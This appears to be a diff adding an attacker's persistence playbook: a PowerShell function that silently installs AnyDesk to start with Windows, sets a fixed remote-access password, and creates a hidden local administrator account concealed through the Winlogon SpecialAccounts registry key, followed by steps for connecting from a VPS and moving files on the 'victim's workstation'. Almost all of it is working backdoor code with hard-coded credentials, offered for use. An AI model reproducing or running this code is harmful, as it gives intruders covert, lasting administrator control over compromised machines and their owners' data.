@@ -1,0 +1,35 @@
+AnyDesk persistence - familiarize everyone
+ Function AnyDesk {
+
+    mkdir "C:\ProgramData\AnyDesk"
+    # Download AnyDesk
+    $clnt = new-object System.Net.WebClient
+    $url = "http://download.anydesk.com/AnyDesk.exe"
+    $file = "C:\ProgramData\AnyDesk.exe"
+    $clnt.DownloadFile($url,$file)
+
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+
+
+    cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+
+
+    net user oldadministrator "qc69t4B#Z0kE3" /add
+    net localgroup Administrators oldadministrator /ADD
+    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v oldadministrator /t REG_DWORD /d 0 /f
+
+    cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+
+    }
+
+    AnyDesk 
+Run code in Powershell ISE Run As Admin 
+Receiving ID 
+Save it  
+Download Anydesk and set ID on dedicated server\VPS\VM   
+Press Console Account  
+Enter password 
+J9kzQ2Y0qO  
+Authorize as local administrator or domain user account and enjoy Anydesk 
+It is also possible to download\upload to\from victim’s workstation (useful for dsocumentation search/view). 
